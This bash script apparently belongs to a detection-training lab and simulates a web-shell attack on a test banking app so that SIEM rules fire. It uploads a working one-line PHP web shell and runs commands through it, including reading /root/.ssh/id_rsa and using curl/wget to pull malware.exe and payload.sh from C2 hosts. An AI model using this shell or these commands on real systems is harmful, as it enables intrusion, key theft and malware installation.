#!/usr/bin/env bash
# Attack (rule 100131 upload + rule 100130 execution): upload a web shell via POST /upload, then
# invoke it through bank-web's file-serving route (GET /files/<shell>?cmd=...), the attacker running
# the shell they planted. Both requests carry the attacker IP, so the two alerts merge into one case
# by IP. The file landing under /uploads also trips FIM rule 100132, a non-forwarded breadcrumb. The
# shell name and the commands vary per run; each exec request trips rule 100129 (indexed, so the
# source IP pivots to the whole command sequence) and the composite 100130 fires once off those.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
ip="$(rand_attacker_ip)"
ua="$(pick 'curl/8.5.0' 'python-requests/2.31' 'Go-http-client/1.1' 'Mozilla/5.0')"
echo "web shell upload + execution from ${ip}"

shellname="$(pick shell cmd up backdoor x r00t sh gate)$(rtok).php"
shell="$(mktemp /tmp/shell.XXXXXX.php)"
cat > "$shell" <<'PHP'
<?php system($_GET['cmd']); ?>
PHP
curl -s -o /dev/null -w "  %{http_code} POST /upload (${shellname})\n" \
  -H "X-Forwarded-For: ${ip}" -H "User-Agent: ${ua}" \
  -F "file=@${shell};filename=${shellname}" \
  "${TARGET}/upload"
rm -f "$shell"

# Post-exploitation: invoke the uploaded shell a few times with different commands. Each request is
# GET /files/<shell>?cmd=<command>, which matches rule 100130 (a request for an uploaded .php). The
# malware pull uses a real C2 domain/IP from the threat-intel list (pick_ioc, same source c2_beacon
# uses), so the command's destination is a live IOC the analyst can confirm on external OSINT.
IFS='|' read -r c2dom _cdl _cds <<<"$(pick_ioc c2 domain)"; c2dom="${c2dom:-ma.zk89.net}"
IFS='|' read -r c2ip  _cil _cis <<<"$(pick_ioc c2 ip)";     c2ip="${c2ip:-185.220.101.44}"
cmds=(id whoami 'uname%20-a' hostname 'ls%20-la%20/root'
      'cat%20/root/.ssh/id_rsa' 'crontab%20-l' 'ps%20aux' 'netstat%20-antp'
      "curl%20https://${c2dom}/malware.exe%20-o%20/tmp/svchost.exe"
      "wget%20https://${c2dom}/payload.sh%20-O%20/tmp/p"
      "curl%20http://${c2ip}/beacon%20-o%20/tmp/b")
n="$(rint 6 9)"
for ((i=1; i<=n; i++)); do
  hit GET "/files/${shellname}?cmd=$(pick "${cmds[@]}")" "$ip" "$ua"
done
